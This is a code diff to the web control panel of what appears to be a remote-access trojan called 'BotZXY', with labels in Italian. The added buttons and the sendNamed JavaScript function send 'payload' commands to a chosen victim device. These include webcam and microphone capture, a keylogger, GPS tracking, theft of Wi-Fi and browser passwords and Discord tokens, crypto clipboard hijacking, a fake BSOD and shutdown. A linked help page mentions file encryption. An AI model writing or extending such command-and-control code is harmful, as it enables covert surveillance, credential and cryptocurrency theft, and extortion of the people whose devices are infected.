@@ -127,6 +127,28 @@
                 </div>
                 <div class="control-group"><label><i class="fas fa-terminal"></i> Comando</label><div style="display:flex;gap:0.3rem;"><input type="text" id="cmdInput" placeholder="Esegui comando..." style="flex:1;padding:0.4rem;border-radius:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:#fff;" /><button class="btn-primary" onclick="sendCommand()"><i class="fas fa-play"></i></button></div></div>
                 <div class="control-group"><label><i class="fas fa-undo"></i> Azioni rapide</label><div style="display:flex;flex-wrap:wrap;gap:0.3rem;"><button class="btn-ghost" onclick="sendKey('ctrl+c')">Ctrl+C</button><button class="btn-ghost" onclick="sendKey('ctrl+v')">Ctrl+V</button><button class="btn-ghost" onclick="sendKey('ctrl+x')">Ctrl+X</button><button class="btn-ghost" onclick="sendKey('ctrl+a')">Ctrl+A</button><button class="btn-ghost" onclick="sendKey('alt+tab')">Alt+Tab</button><button class="btn-ghost" onclick="sendKey('win')">Win</button></div></div>
+                <div class="control-group">
+                    <label><i class="fas fa-terminal"></i> Comandi Payload</label>
+                    <div style="display:flex;flex-wrap:wrap;gap:0.3rem;">
+                        <button class="btn-ghost" onclick="sendNamed('screenshot')"><i class="fas fa-camera"></i> Screenshot</button>
+                        <button class="btn-ghost" onclick="sendNamed('webcam')"><i class="fas fa-video"></i> Webcam</button>
+                        <button class="btn-ghost" onclick="sendNamed('mic','10')"><i class="fas fa-microphone"></i> Mic 10s</button>
+                        <button class="btn-ghost" onclick="sendNamed('keylogger_start')"><i class="fas fa-keyboard"></i> Keylogger</button>
+                        <button class="btn-ghost" onclick="sendNamed('gps')"><i class="fas fa-location-dot"></i> GPS</button>
+                        <button class="btn-ghost" onclick="sendNamed('grab_wifi')"><i class="fas fa-wifi"></i> WiFi</button>
+                        <button class="btn-ghost" onclick="sendNamed('grab_passwords')"><i class="fas fa-lock"></i> Browser Pass</button>
+                        <button class="btn-ghost" onclick="sendNamed('steal_discord')"><i class="fab fa-discord"></i> Discord</button>
+                        <button class="btn-ghost" onclick="sendNamed('sysinfo')"><i class="fas fa-microchip"></i> SysInfo</button>
+                        <button class="btn-ghost" onclick="sendNamed('list_processes')"><i class="fas fa-tasks"></i> Processi</button>
+                        <button class="btn-ghost" onclick="sendNamed('clipboard_crypto')"><i class="fas fa-bitcoin"></i> Clip Crypto</button>
+                        <button class="btn-ghost" onclick="sendNamed('msgbox','Ciao da BotZXY')"><i class="fas fa-comment"></i> MsgBox</button>
+                        <button class="btn-ghost" onclick="sendNamed('tts','Ti controllo')"><i class="fas fa-volume-up"></i> TTS</button>
+                        <button class="btn-ghost" onclick="sendNamed('monitor_off')"><i class="fas fa-power-off"></i> Monitor Off</button>
+                        <button class="btn-ghost" onclick="sendNamed('bsod_fake')"><i class="fas fa-skull"></i> Fake BSOD</button>
+                        <button class="btn-ghost" onclick="sendNamed('shutdown')"><i class="fas fa-power-off"></i> Shutdown</button>
+                    </div>
+                    <div class="desc" style="font-size:0.65rem;color:rgba(255,255,255,0.2);margin-top:0.4rem;">Vedi <a href="/api/command/help" style="color:#a78bfa;">/api/command/help</a> per l'elenco completo (file_list, encrypt_files, block_site, ecc.).</div>
+                </div>
             </div>
         </div>
     </main>
@@ -145,6 +167,7 @@
         function sendMouseScroll(direction){ if(!selectedDevice){ alert('Seleziona un dispositivo prima!'); return; } fetch('/api/remote/mouse',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({device_id:selectedDevice,action:'scroll',direction:direction})}).then(()=>{ alert('✅ Scroll '+direction+' inviato'); }).catch(()=>{ alert('❌ Errore'); }); }
         function sendKey(key){ if(!selectedDevice){ alert('Seleziona un dispositivo prima!'); return; } fetch('/api/remote/key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({device_id:selectedDevice,key:key})}).then(()=>{ console.log('✅ Tasto inviato:',key); }).catch(()=>{}); }
         function sendCommand(){ const cmd=document.getElementById('cmdInput').value; if(!cmd||!selectedDevice){ alert('Seleziona un dispositivo e inserisci un comando!'); return; } fetch('/api/command/'+selectedDevice,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'execute',params:cmd})}).then(()=>{ alert('✅ Comando inviato: '+cmd); document.getElementById('cmdInput').value=''; }).catch(()=>{ alert('❌ Errore'); }); }
+        function sendNamed(command, params){ if(!selectedDevice){ alert('Seleziona prima un dispositivo!'); return; } fetch('/api/command/'+selectedDevice,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:command,params:params||''})}).then(()=>{ console.log('✅ '+command); }).catch(()=>{ alert('❌ Errore invio '+command); }); }
         function updateTime(){ document.getElementById('footerTime').textContent=new Date().toLocaleTimeString('it-IT'); }
         refreshDevices(); setInterval(refreshDevices,30000); setInterval(updateTime,1000); updateTime();
     </script>
